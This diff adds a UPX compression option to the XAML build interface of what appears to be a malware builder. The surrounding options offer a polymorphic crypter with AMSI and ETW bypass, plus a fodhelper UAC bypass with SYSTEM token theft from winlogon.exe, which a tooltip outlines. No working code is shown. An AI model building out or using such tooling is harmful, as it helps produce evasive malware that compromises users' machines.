@@ -1020,6 +1020,8 @@
                                         <CheckBox x:Name="BldEncrypt"   Content="Crypter (AES-256, polymorphic, AMSI+ETW bypass) — closed-source"  Style="{StaticResource SChk}" />
                                         <CheckBox x:Name="BldUacBypass" Content="UAC Bypass + SYSTEM elevation (fodhelper chain) — closed-source" Style="{StaticResource SChk}"
                                                   ToolTip="① fodhelper UAC bypass (ms-settings HKCU hijack). ② SeDebugPrivilege + vol de token winlogon.exe pour SYSTEM." />
+                                        <CheckBox x:Name="BldUpx" Content="UPX compression (upx.exe must be in PATH or tools/)" Style="{StaticResource SChk}"
+                                                  ToolTip="Runs upx --best --lzma on the final output. Reduces ~8 MB → ~3.5 MB. Requires upx.exe." />
                                         <Border Margin="18,2,0,0" Padding="8,5"
                                                 Background="#1AF59E0B" BorderBrush="#60F59E0B"
                                                 BorderThickness="1" CornerRadius="5"
